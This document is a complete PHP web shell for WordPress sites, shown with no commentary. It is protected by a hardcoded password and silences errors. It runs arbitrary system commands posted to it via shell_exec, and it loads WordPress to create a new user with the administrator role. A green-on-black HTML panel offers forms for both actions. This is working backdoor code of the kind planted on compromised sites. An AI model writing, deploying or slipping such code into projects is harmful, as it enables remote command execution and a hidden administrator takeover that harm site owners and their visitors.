<?php
error_reporting(0);
$p='woo2025';
if(!isset($_REQUEST['k'])||$_REQUEST['k']!==$p)die();
$d=dirname(__FILE__);for($i=0;$i<5;$i++){$d=dirname($d);if(file_exists($d.'/wp-load.php')){$w=$d.'/wp-load.php';break;}}
if(isset($_POST['c'])){echo'<pre>'.htmlspecialchars(shell_exec($_POST['c'])).'</pre>';}
if(isset($_POST['u'],$_POST['e'],$_POST['pw'])&&isset($w)){define('WP_USE_THEMES',false);require_once($w);$id=wp_create_user($_POST['u'],$_POST['pw'],$_POST['e']);if(!is_wp_error($id)){(new WP_User($id))->set_role('administrator');echo'OK:'.$id;}else{echo'ERR';}}
?><!DOCTYPE html><html><head><title>H</title><style>body{font:14px monospace;background:#111;color:#0f0;padding:20px}input,button{padding:8px;margin:2px;background:#222;color:#0f0;border:1px solid #0f0}button{cursor:pointer}pre{background:#000;padding:10px}</style></head><body><h3>Admin</h3><form method=post><input name=k value="<?=$p?>" type=hidden><input name=u placeholder=user><input name=e placeholder=email><input name=pw placeholder=pass><button>Add</button></form><h3>CMD</h3><form method=post><input name=k value="<?=$p?>" type=hidden><input name=c placeholder=command style=width:300px><button>Run</button></form></body></html>
